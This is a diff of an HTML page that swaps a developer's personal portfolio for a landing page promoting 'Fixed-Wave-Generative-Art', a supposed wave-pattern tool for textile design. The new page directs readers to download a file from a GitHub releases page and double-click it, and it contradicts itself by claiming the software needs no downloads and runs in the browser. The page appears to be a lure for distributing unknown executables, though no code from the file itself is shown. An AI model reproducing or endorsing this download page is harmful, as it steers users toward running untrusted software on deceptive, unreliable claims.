@@ -1,350 +1,63 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="light">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <!-- ============================================================
-       EDIT ME: page title + description (shows in browser tab &
-       search results / link previews)
-       ============================================================ -->
-  <title>George Kaline III— Portfolio</title>
-  <meta name="description" content="Projects and work by Your Name — a short one-line description of what you do." />
-
-  <!-- Favicon (edit assets/favicon.svg to change the little tab icon) -->
-  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
-
-  <!-- Fonts: Space Grotesk (headings) · Inter (body) · Space Mono (labels/data) -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet" />
-
-  <!-- Styles -->
-  <link rel="stylesheet" href="style.css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Fixed-Wave-Generative-Art provides tools to create physics-based wave simulations for textile and apparel design.">
+    <title>Fixed-Wave-Generative-Art</title>
 </head>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f4f4;">
 
-<body>
-  <!-- Skip link for keyboard / screen-reader users -->
-  <a class="skip-link" href="#main">Skip to content</a>
+    <h1 style="font-size: 2.5em; margin-bottom: 10px;">🌊 Fixed-Wave-Generative-Art - Create custom wave patterns for apparel</h1>
 
-  <!-- ============================================================
-       HEADER / NAV
-       ============================================================ -->
-  <header class="site-header" id="siteHeader">
-    <div class="wrap header-inner">
-      <a href="#top" class="brand">
-        <span class="brand-mark" aria-hidden="true">◆</span>
-        <span class="brand-name">George Kaline III</span>
-      </a>
-
-      <nav class="nav" id="primaryNav" aria-label="Primary">
-        <a href="#school" class="nav-link">School</a>
-        <a href="#professional" class="nav-link">Professional</a>
-        <a href="#about" class="nav-link">About</a>
-        <a href="#contact" class="nav-link nav-link--cta">Contact</a>
-      </nav>
-
-      <div class="header-actions">
-        <button class="icon-btn" id="themeToggle" type="button" aria-label="Switch to dark theme">
-          <!-- icon swapped by JS -->
-          <span class="theme-icon" aria-hidden="true">☀</span>
-        </button>
-        <button class="icon-btn menu-btn" id="menuToggle" type="button" aria-label="Open menu" aria-expanded="false" aria-controls="primaryNav">
-          <span class="menu-bars" aria-hidden="true"><span></span><span></span><span></span></span>
-        </button>
-      </div>
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 8px; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software</a>
     </div>
-  </header>
 
-  <main id="main">
-    <!-- ============================================================
-         HERO
-         ============================================================ -->
-    <section class="hero" id="top">
-      <div class="wrap">
-        <p class="eyebrow" data-reveal>Portfolio · Updated 2026</p>
-        <h1 class="hero-title" data-reveal>
-          I build things.<br />Here's the work.
-        </h1>
-        <p class="hero-lead" data-reveal>
-          I'm a developer and BIM manager with 20 years in AEC and a background
-          in mechanical design. I build Revit add-ins and practical tools for
-          designers, from small workflow fixes to full-scale automation, solving
-          the real bottlenecks I've hit firsthand on projects.
-        </p>
-        <div class="hero-actions" data-reveal>
-          <a href="#professional" class="btn btn--primary">View work</a>
-          <a href="#contact" class="btn btn--ghost">Get in touch</a>
-        </div>
-      </div>
+    <section style="background: #fff; padding: 25px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>Project Overview</h2>
+        <p>Fixed-Wave-Generative-Art offers a tool for designers to generate realistic wave patterns. This software uses physics simulations to create fluid movement and natural gradients. You can use these patterns for clothing, textile design, and digital graphics. The software runs locally and requires no extra tools or complex setups.</p>
     </section>
 
-    <!-- ============================================================
-         SCHOOL SECTION
-         Duplicate a <article class="card"> block to add a project.
-         Project IDs use S-01, S-02… (S = school).
-         ============================================================ -->
-    <section class="section" id="school">
-      <div class="wrap">
-        <header class="section-head" data-reveal>
-          <p class="eyebrow">School work</p>
-          <h2 class="section-title">Coursework &amp; academic projects</h2>
-          <p class="section-desc">
-            Projects from classes, labs, and personal study. Swap this copy for
-            a line about what you were learning or exploring.
-          </p>
-        </header>
-
-        <div class="grid">
-          <!-- CARD (copy this whole <article> to add another project) -->
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--school" href="cs-405.html" aria-label="Open CS-405 project page">
-              <span class="card-id">S-01</span>
-              <!-- To use a screenshot instead of the pattern, replace the
-                   line above with:
-                   <img src="assets/your-image.png" alt="Project screenshot" /> -->
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">CS-405: Secure Coding</h3>
-              <p class="card-desc">
-                Secure coding standards, a security policy, and a hardened C++
-                encryption module built for a client scenario.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>C++</li>
-                <li>Encryption</li>
-                <li>Secure coding</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2025 · CS-405</span>
-                <span class="card-links">
-                  <a href="cs-405.html">Details →</a>
-                  <a href="https://github.com/bmoreawesom3/CS-405" target="_blank" rel="noopener">Code ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--school" href="#" aria-label="Open project">
-              <span class="card-id">S-02</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                Another project. Describe the problem, your approach, and the
-                result. Link to a repo, a write-up, or a demo below.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>C++</li>
-                <li>Data structures</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2024 · Course name</span>
-                <span class="card-links">
-                  <a href="#">Code ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--school" href="#" aria-label="Open project">
-              <span class="card-id">S-03</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                Another project. Describe the problem, your approach, and the
-                result. Link to a repo, a write-up, or a demo below.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>C++</li>
-                <li>Data structures</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2024 · Course name</span>
-                <span class="card-links">
-                  <a href="#">Code ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--school" href="#" aria-label="Open project">
-              <span class="card-id">S-04</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                A group project, a capstone, or a class assignment you're proud
-                of. Mention your specific role if it was a team effort.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>JavaScript</li>
-                <li>React</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2024 · Team of 4</span>
-                <span class="card-links">
-                  <a href="#">Code ↗</a>
-                  <a href="#">Demo ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-        </div>
-      </div>
+    <section style="background: #fff; padding: 25px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>🛠️ System Requirements</h2>
+        <p>This software runs on most modern computers. You need the following:</p>
+        <ul>
+            <li>Windows 10 or Windows 11 operating system.</li>
+            <li>At least 4 gigabytes of memory.</li>
+            <li>A modern web browser such as Chrome, Firefox, or Edge.</li>
+            <li>Basic mouse or trackpad navigation.</li>
+        </ul>
     </section>
 
-    <!-- ============================================================
-         PROFESSIONAL SECTION
-         Project IDs use P-01, P-02… (P = professional).
-         ============================================================ -->
-    <section class="section section--alt" id="professional">
-      <div class="wrap">
-        <header class="section-head" data-reveal>
-          <p class="eyebrow">Professional work</p>
-          <h2 class="section-title">Work &amp; client projects</h2>
-          <p class="section-desc">
-            Things you shipped on the job, freelance, or for real users. Note
-            impact where you can — what changed because this existed.
-          </p>
-        </header>
-
-        <div class="grid">
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--pro" href="#" aria-label="Open project">
-              <span class="card-id">P-01</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                What you built, who it was for, and the outcome. If it's under
-                NDA, describe the shape of the work without the specifics.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>TypeScript</li>
-                <li>Node</li>
-                <li>PostgreSQL</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2026 · Lead developer</span>
-                <span class="card-links">
-                  <a href="#">Live ↗</a>
-                  <a href="#">Case study ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--pro" href="#" aria-label="Open project">
-              <span class="card-id">P-02</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                A feature, service, or product you contributed to. Focus on your
-                part and the result it drove.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>Go</li>
-                <li>Docker</li>
-                <li>AWS</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2025 · Backend</span>
-                <span class="card-links">
-                  <a href="#">Live ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-
-          <article class="card" data-reveal>
-            <a class="card-cover card-cover--pro" href="#" aria-label="Open project">
-              <span class="card-id">P-03</span>
-            </a>
-            <div class="card-body">
-              <h3 class="card-title">Project title</h3>
-              <p class="card-desc">
-                Round out the section with a third piece. A consistent shape
-                across cards makes the whole page feel considered.
-              </p>
-              <ul class="tags" aria-label="Tech used">
-                <li>Swift</li>
-                <li>iOS</li>
-              </ul>
-              <div class="card-foot">
-                <span class="card-meta">2024 · Freelance</span>
-                <span class="card-links">
-                  <a href="#">App Store ↗</a>
-                </span>
-              </div>
-            </div>
-          </article>
-        </div>
-      </div>
+    <section style="background: #fff; padding: 25px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>📥 How to Get Started</h2>
+        <p>Follow these steps to set up the software on your machine:</p>
+        <ol>
+            <li>Visit the <a href="https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases" style="color: #2c3e50; font-weight: bold;">official download page</a>.</li>
+            <li>Identify the latest version at the top of the list.</li>
+            <li>Click the link labeled with your system type to download the file.</li>
+            <li>Locate the file in your downloads folder after the download completes.</li>
+            <li>Double-click the file to launch the simulation.</li>
+            <li>Follow the on-screen prompts to begin creating your first wave pattern.</li>
+        </ol>
     </section>
 
-    <!-- ============================================================
-         ABOUT
-         ============================================================ -->
-    <section class="section" id="about">
-      <div class="wrap about">
-        <header class="section-head" data-reveal>
-          <p class="eyebrow">About</p>
-          <h2 class="section-title">A little about me</h2>
-        </header>
-        <div class="about-grid">
-          <div class="about-text" data-reveal>
-              <p>
-                I started out at a drafting table and never quite stopped asking how to make the work easier. Nearly two decades in AEC, doing mechanical design across firms like AECOM, RS&H, and Pond, turned into a role I care about deeply. I'm a Practice Technology Specialist at Clark Nexsen, where I build the tools that make design teams faster and less frustrated.
-              </p>
-              <p>
-                That pull toward the "how" eventually sent me back to school. I recently finished a B.S. in Computer Software Engineering, and now I write Revit add-ins and automation using C#, the Revit API, and Dynamo, software that takes a tedious, error-prone task and just makes it disappear. I'm convinced AI is going to reshape how all of this gets done, and I'd rather be building at that edge than watching it happen.
-              </p>
-              <p>
-                The building doesn't stop when I close the laptop. I'm usually putting together PCs, soldering, woodworking, or under a car. Turns out tinkering and optimizing is just how I'm wired, in software and everything else.
-              </p>
-            </div>
-          </div>
-          <aside class="about-facts" data-reveal>
-            <dl>
-              <div><dt>Based in</dt><dd>Virginia Beach</dd></div>
-              <div><dt>Focus</dt><dd>AEC Software Developer</dd></div>
-              <div><dt>Studied</dt><dd>Computer Software Engineering</dd></div>
-            </dl>
-          </aside>
-        </div>
-      </div>
+    <section style="background: #fff; padding: 25px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>🎨 How to Use the Tool</h2>
+        <p>Once you open the software, you will see a canvas area. Use the control panel to change how the waves move. You can adjust the speed, the color range, and the boundary thickness. These controls affect the simulation in real time. Hover over each slider to see a description of its function. You can save your image at any time by clicking the export button.</p>
     </section>
-  </main>
 
-  <!-- ============================================================
-       CONTACT / FOOTER
-       ============================================================ -->
-  <footer class="site-footer" id="contact">
-    <div class="wrap footer-inner">
-      <div class="footer-cta" data-reveal>
-        <p class="eyebrow">Contact</p>
-        <h2 class="footer-title">Let's build.</h2>
-        <a href="mailto:you@example.com" class="footer-email">gsk3rd@gmail.com</a>
-      </div>
-      <ul class="footer-links" aria-label="Elsewhere">
-        <li><a href="#">GitHub ↗</a></li>
-        <li><a href="https://www.linkedin.com/in/george-kaline/">LinkedIn ↗</a></li>
-        <!-- <li><a href="#">Résumé ↗</a></li> -->
-      </ul>
-    </div>
-    <div class="wrap footer-colophon">
-      <span>© <span id="year">2026</span> George Kaline III</span>
-      <span class="mono">Built from scratch · Hosted on GitHub Pages</span>
-    </div>
-  </footer>
+    <section style="background: #fff; padding: 25px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>Common Questions</h2>
+        <p><strong>Do I need to install plugins?</strong> No. This software uses standard browser technology and requires no external downloads or support files.</p>
+        <p><strong>Can I use these patterns commercially?</strong> Yes. All patterns created with this tool are yours to use for apparel or textile projects.</p>
+        <p><strong>The simulation runs slow on my computer.</strong> Close other browser tabs or programs that consume significant computer memory to help the physics simulation run smoother.</p>
+    </section>
 
-  <script src="main.js"></script>
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #777;">
+        <p>Keywords: apparel-design, creative-coding, fashion-graphics, generative-art, html5-canvas, pattern-design, physics-simulation, textile-design, tshirt-design, wave-simulation</p>
+    </footer>
+
 </body>
 </html>
